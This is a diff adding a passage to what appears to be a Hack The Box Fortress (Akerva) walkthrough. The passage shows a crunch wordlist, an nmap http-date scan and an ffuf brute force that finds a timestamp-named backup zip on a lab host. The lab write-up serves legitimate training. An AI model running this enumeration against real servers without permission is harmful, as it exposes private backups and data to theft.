@@ -577,3 +577,54 @@ do
 	sleep 1020
 done
 ```
+
+
+```bash
+crunch 4 4 0123456789 -o 4-digit
+Crunch will now generate the following amount of data: 50000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 10000 
+
+crunch: 100% completed generating output
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/Fotress/Akerva]
+└─# nmap -p 80 --script http-date 10.13.37.11
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-16 03:56 EST
+Nmap scan report for 10.13.37.11
+Host is up (0.23s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+|_http-date: Tue, 16 Nov 2021 07:27:26 GMT; -1h28m58s from local time.
+
+Nmap done: 1 IP address (1 host up) scanned in 1.79 seconds
+                                                                                                                      
+┌──(root💀kali)-[~/Downloads/hackthebox/Fotress/Akerva]
+└─# ffuf -u http://10.13.37.11/backups/backup_2021111607FUZZ.zip -w 4-digit
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.13.37.11/backups/backup_2021111607FUZZ.zip
+ :: Wordlist         : FUZZ: 4-digit
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+2236                    [Status: 200, Size: 22071775, Words: 0, Lines: 0]
+:: Progress: [10000/10000] :: Job [1/1] :: 174 req/sec :: Duration: [0:01:01] :: Errors: 0 ::
+````
